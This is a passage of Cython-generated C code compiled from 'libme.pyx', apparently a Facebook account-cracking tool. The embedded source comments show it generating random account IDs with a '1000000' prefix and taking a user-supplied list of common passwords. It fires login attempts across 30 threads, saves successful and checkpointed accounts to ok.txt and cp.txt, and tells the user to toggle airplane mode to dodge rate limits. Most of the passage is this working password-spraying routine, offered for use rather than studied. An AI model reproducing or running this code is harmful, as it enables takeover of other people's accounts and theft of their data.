 * 			os.system('xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA')
 * 	def __start__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		try:
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("libme.James.__start__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_key);
  __Pyx_XDECREF(__pyx_v_a);
  __Pyx_XDECREF(__pyx_v_status);
  __Pyx_XDECREF(__pyx_v_expired);
  __Pyx_XDECREF(__pyx_v_choose);
  __Pyx_XDECREF(__pyx_v_apikey);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":149
 * 			else:
 * 				exit("  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6")
 * 	def __fb__(self):             # <<<<<<<<<<<<<<
 * 		x = 11111111
 * 		xx = 99999999
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_7__fb__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_7__fb__ = {"__fb__", (PyCFunction)__pyx_pw_5libme_5James_7__fb__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_7__fb__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__fb__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_6__fb__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_6__fb__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  long __pyx_v_x;
  long __pyx_v_xx;
  PyObject *__pyx_v_idx = NULL;
  PyObject *__pyx_v_limit = NULL;
  PyObject *__pyx_v_i = NULL;
  PyObject *__pyx_v_ib = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  PyObject *(*__pyx_t_7)(PyObject *);
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  int __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  PyObject *__pyx_t_20 = NULL;
  int __pyx_t_21;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__fb__", 0);

  /* "libme.pyx":150
 * 				exit("  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6")
 * 	def __fb__(self):
 * 		x = 11111111             # <<<<<<<<<<<<<<
 * 		xx = 99999999
 * 		idx = "1000000"
 */
  __pyx_v_x = 0xA98AC7;

  /* "libme.pyx":151
 * 	def __fb__(self):
 * 		x = 11111111
 * 		xx = 99999999             # <<<<<<<<<<<<<<
 * 		idx = "1000000"
 * 		limit = int(input("  \033[0;92m[!] Enter The Number Of Ids : "))
 */
  __pyx_v_xx = 0x5F5E0FF;

  /* "libme.pyx":152
 * 		x = 11111111
 * 		xx = 99999999
 * 		idx = "1000000"             # <<<<<<<<<<<<<<
 * 		limit = int(input("  \033[0;92m[!] Enter The Number Of Ids : "))
 * 		try:
 */
  __Pyx_INCREF(__pyx_kp_s_1000000);
  __pyx_v_idx = __pyx_kp_s_1000000;

  /* "libme.pyx":153
 * 		xx = 99999999
 * 		idx = "1000000"
 * 		limit = int(input("  \033[0;92m[!] Enter The Number Of Ids : "))             # <<<<<<<<<<<<<<
 * 		try:
 * 			for i in range(limit):
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_limit = __pyx_t_2;
  __pyx_t_2 = 0;

  /* "libme.pyx":154
 * 		idx = "1000000"
 * 		limit = int(input("  \033[0;92m[!] Enter The Number Of Ids : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      /* "libme.pyx":155
 * 		limit = int(input("  \033[0;92m[!] Enter The Number Of Ids : "))
 * 		try:
 * 			for i in range(limit):             # <<<<<<<<<<<<<<
 * 				i = random.randint(x,xx)
 * 				ib = idx
 */
      __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_limit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 155, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
        __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1); __pyx_t_6 = 0;
        __pyx_t_7 = NULL;
      } else {
        __pyx_t_6 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 155, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_7 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 155, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      for (;;) {
        if (likely(!__pyx_t_7)) {
          if (likely(PyList_CheckExact(__pyx_t_1))) {
            if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_2); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 155, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 155, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          } else {
            if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_2); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 155, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 155, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          }
        } else {
          __pyx_t_2 = __pyx_t_7(__pyx_t_1);
          if (unlikely(!__pyx_t_2)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 155, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_2);
        }
        __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "libme.pyx":156
 * 		try:
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)             # <<<<<<<<<<<<<<
 * 				ib = idx
 * 				self.id.append(ib+str(i))
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 156, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 156, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyInt_From_long(__pyx_v_x); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 156, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_10 = __Pyx_PyInt_From_long(__pyx_v_xx); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 156, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_11 = NULL;
        __pyx_t_12 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_12 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_9)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_t_8, __pyx_t_10};
          __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 156, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_t_8, __pyx_t_10};
          __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 156, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        } else
        #endif
        {
          __pyx_t_13 = PyTuple_New(2+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 156, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_11); __pyx_t_11 = NULL;
          }
          __Pyx_GIVEREF(__pyx_t_8);
          PyTuple_SET_ITEM(__pyx_t_13, 0+__pyx_t_12, __pyx_t_8);
          __Pyx_GIVEREF(__pyx_t_10);
          PyTuple_SET_ITEM(__pyx_t_13, 1+__pyx_t_12, __pyx_t_10);
          __pyx_t_8 = 0;
          __pyx_t_10 = 0;
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_13, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 156, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        }
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF_SET(__pyx_v_i, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "libme.pyx":157
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 * 				ib = idx             # <<<<<<<<<<<<<<
 * 				self.id.append(ib+str(i))
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;0m"%(len(self.id)))
 */
        __Pyx_INCREF(__pyx_v_idx);
        __Pyx_XDECREF_SET(__pyx_v_ib, __pyx_v_idx);

        /* "libme.pyx":158
 * 				i = random.randint(x,xx)
 * 				ib = idx
 * 				self.id.append(ib+str(i))             # <<<<<<<<<<<<<<
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;0m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 158, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_9 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_i); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 158, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_13 = PyNumber_Add(__pyx_v_ib, __pyx_t_9); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 158, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_14 = __Pyx_PyObject_Append(__pyx_t_2, __pyx_t_13); if (unlikely(__pyx_t_14 == ((int)-1))) __PYX_ERR(0, 158, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

        /* "libme.pyx":155
 * 		limit = int(input("  \033[0;92m[!] Enter The Number Of Ids : "))
 * 		try:
 * 			for i in range(limit):             # <<<<<<<<<<<<<<
 * 				i = random.randint(x,xx)
 * 				ib = idx
 */
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":159
 * 				ib = idx
 * 				self.id.append(ib+str(i))
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;0m"%(len(self.id)))             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;92m[*] For example separators : 123456,123456789")
 */
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_6 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = PyInt_FromSsize_t(__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_13 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_91m_s_0_0m, __pyx_t_1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

      /* "libme.pyx":160
 * 				self.id.append(ib+str(i))
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;0m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;92m[*] For example separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 */
      /*with:*/ {
        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 160, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 160, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 160, __pyx_L3_error)
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_empty_tuple, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 160, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_15 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 160, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 160, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_9 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_13);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_13, function);
          }
        }
        __pyx_t_1 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 160, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_13 = __pyx_t_1;
        __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        /*try:*/ {
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18);
            __Pyx_XGOTREF(__pyx_t_16);
            __Pyx_XGOTREF(__pyx_t_17);
            __Pyx_XGOTREF(__pyx_t_18);
            /*try:*/ {
              __pyx_v_coeg = __pyx_t_13;
              __pyx_t_13 = 0;

              /* "libme.pyx":161
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;0m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;92m[*] For example separators : 123456,123456789")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_0_92m_For_example_separators_12) < 0) __PYX_ERR(0, 161, __pyx_L15_error)

              /* "libme.pyx":162
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;92m[*] For example separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 */
              __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 162, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              __pyx_v_listpass = __pyx_t_13;
              __pyx_t_13 = 0;

              /* "libme.pyx":163
 * 				print("\n  \033[0;92m[*] For example separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;92m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
              __pyx_t_6 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 163, __pyx_L15_error)
              __pyx_t_19 = ((__pyx_t_6 <= 5) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":164
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;92m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;92m[] Ok result saved in > ok.txt")
 */
                __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 164, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_13);
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                /* "libme.pyx":163
 * 				print("\n  \033[0;92m[*] For example separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;92m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
              }

              /* "libme.pyx":165
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;92m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;92m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
              __pyx_t_13 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_92m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 165, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 165, __pyx_L15_error)
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

              /* "libme.pyx":166
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;92m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;92m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_0_92m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 166, __pyx_L15_error)

              /* "libme.pyx":167
 * 				print("  \033[0;92m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;92m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 167, __pyx_L15_error)

              /* "libme.pyx":168
 * 				print("\n  \033[0;92m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					coeg.submit(self.__api__, user, listpass.split(","))
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 168, __pyx_L15_error)

              /* "libme.pyx":169
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__api__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")
 */
              __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 169, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              if (likely(PyList_CheckExact(__pyx_t_13)) || PyTuple_CheckExact(__pyx_t_13)) {
                __pyx_t_2 = __pyx_t_13; __Pyx_INCREF(__pyx_t_2); __pyx_t_6 = 0;
                __pyx_t_7 = NULL;
              } else {
                __pyx_t_6 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 169, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __pyx_t_7 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 169, __pyx_L15_error)
              }
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              for (;;) {
                if (likely(!__pyx_t_7)) {
                  if (likely(PyList_CheckExact(__pyx_t_2))) {
                    if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_2)) break;
                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                    __pyx_t_13 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_13); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 169, __pyx_L15_error)
                    #else
                    __pyx_t_13 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 169, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    #endif
                  } else {
                    if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                    __pyx_t_13 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_13); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 169, __pyx_L15_error)
                    #else
                    __pyx_t_13 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 169, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    #endif
                  }
                } else {
                  __pyx_t_13 = __pyx_t_7(__pyx_t_2);
                  if (unlikely(!__pyx_t_13)) {
                    PyObject* exc_type = PyErr_Occurred();
                    if (exc_type) {
                      if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                      else __PYX_ERR(0, 169, __pyx_L15_error)
                    }
                    break;
                  }
                  __Pyx_GOTREF(__pyx_t_13);
                }
                __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_13);
                __pyx_t_13 = 0;

                /* "libme.pyx":170
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 * 					coeg.submit(self.__api__, user, listpass.split(","))             # <<<<<<<<<<<<<<
 * 			exit("\n\n [] Cracking finished...")
 * 		except Exception as e:
 */
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 170, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_api); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 170, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 170, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_8);
                __pyx_t_11 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
                  __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_8);
                  if (likely(__pyx_t_11)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                    __Pyx_INCREF(__pyx_t_11);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_8, function);
                  }
                }
                __pyx_t_10 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_11, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_s__12);
